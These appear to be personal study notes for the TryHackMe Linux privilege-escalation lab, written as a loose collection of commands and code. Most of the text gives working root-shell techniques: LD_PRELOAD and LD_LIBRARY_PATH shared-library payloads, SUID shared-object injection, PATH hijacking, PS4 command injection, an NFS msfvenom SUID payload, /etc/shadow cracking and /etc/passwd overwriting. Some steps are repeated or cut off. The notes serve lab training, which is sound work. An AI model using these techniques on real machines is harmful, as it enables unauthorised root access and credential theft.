###
```
sudo su - 
su - 
bash -p
```

### 
https://tryhackme.com/room/linuxprivesc


###sudo -l
```
Linux VM

1. In command prompt type: sudo -l
2. From the output, notice that the LD_PRELOAD environment variable is intact.

Exploitation

1. Open a text editor and type:

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

2. Save the file as x.c
3. In command prompt type:
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
4. In command prompt type:
sudo LD_PRELOAD=/tmp/x.so apache2
5. In command prompt type: id
```
```
sudo earlier than 1.8.26
Check *** pwfeedback https://github.com/saleemrashid/sudo-cve-2019-18634




history

find .

cat /etc/os-release
uname -a




```
```
https://www.hackingarticles.in/linux-privilege-escalation-automated-script/
https://github.com/belane/linux-soft-exploit-suggester
```
```
pspy
https://github.com/DominicBreuker/pspy

```
### SUID / SGID Executables - Abusing Shell Features (#2)
```Note: This will not work on Bash versions 4.4 and above.

When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.
Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:

env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2

Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

/tmp/rootbash -p
```

```
Detection

Linux VM

1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
2. From the output, make note of all the SUID binaries.
3. In command line type:
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
4. From the output, notice that a .so file is missing from a writable directory.

Exploitation

Linux VM

5. In command prompt type: mkdir /home/user/.config
6. In command prompt type: cd /home/user/.config
7. Open a text editor and type:

#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}

8. Save the file as libcalc.c
9. In command prompt type:
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
10. In command prompt type: /usr/local/bin/suid-so
11. In command prompt type: id
```
### SUID(ENV Variable )
```
Detection

Linux VM

1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
2. From the output, make note of all the SUID binaries.
3. In command prompt type: strings /usr/local/bin/suid-env
4. From the output, notice the functions used by the binary.

Exploitation

Linux VM

1. In command prompt type:
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
2. In command prompt type: gcc /tmp/service.c -o /tmp/service
3. In command prompt type: export PATH=/tmp:$PATH
4. In command prompt type: /usr/local/bin/suid-env
5. In command prompt type: id
```
```
---------------------------------------------
python -c 'import os;os.execl("/bin/sh","sh","-p")'
------------------------------------------------
Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
Check the NFS share configuration on the Debian VM:

cat /etc/exports

Note that the /tmp share has root squashing disabled.
On your Kali box, switch to your root user if you are not already running as root:
sudo su

Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):

mkdir /tmp/nfs
mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs

Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf

Still using Kali's root user, make the file executable and set the SUID permission:
chmod +xs /tmp/nfs/shell.elf

Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:
/tmp/shell.elf
```

```
MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)
The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a popular exploit that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.

ls -l /etc/shadow
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

ls -l /etc/shadow
mkpasswd -m sha-512 newpasswordhere

ls -l /etc/passwd
openssl passwd newpasswordhere
root:Z.5x9gGZx7J7U:0:0:root:/root:/bin/bash

 
```
### LD_PRELOAD
```
/home/kali/priv/linux/tools/sudo/preload.c

```
![image](https://user-images.githubusercontent.com/9059079/120900722-687b1e00-c604-11eb-9020-8b1b9e5b59c1.png)

```
/home/kali/priv/linux/tools/sudo/library_path.c
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp apache2
```
```
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
/tmp/rootbash -p
```
![image](https://user-images.githubusercontent.com/9059079/120907045-51e8bd00-c62c-11eb-85bd-c01fd4fdc4ba.png)
### Note that the tar command is being run with a wildcard (*) in your home directory.
![image](https://user-images.githubusercontent.com/9059079/120907077-b3a92700-c62c-11eb-80c9-b2d894c3684b.png)

![image](https://user-images.githubusercontent.com/9059079/120907091-cb80ab00-c62c-11eb-9b24-ec9a83439104.png)
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null


```

### The /usr/local/bin/suid-so SUID executable is vulnerable to shared object injection
```
/home/kali/priv/linux/tools/suid/libcalc.c
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```
![image](https://user-images.githubusercontent.com/9059079/120907159-4944b680-c62d-11eb-8490-1ab5b6b7b339.png)

### SUID / SGID Executables - Environment Variables
```
gcc -o service /home/user/tools/suid/service.c

strings /usr/local/bin/suid-env
PATH=.:$PATH /usr/local/bin/suid-env
```
### /bin/bash --version In Bash versions <4.2-048 i
```
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
```
kdir /tmp/nfs
mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
```

```
![image](https://user-images.githubusercontent.com/9059079/120907301-52825300-c62e-11eb-8807-4cdb22c86d89.png)

### capability
```
1. In command prompt type: getcap -r / 2>/dev/null
2. From the output, notice the value of the “cap_setuid” capability.
1. In command prompt type: getcap -r / 2>/dev/null
2. From the output, notice the value of the “cap_setuid” capability.

```
https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
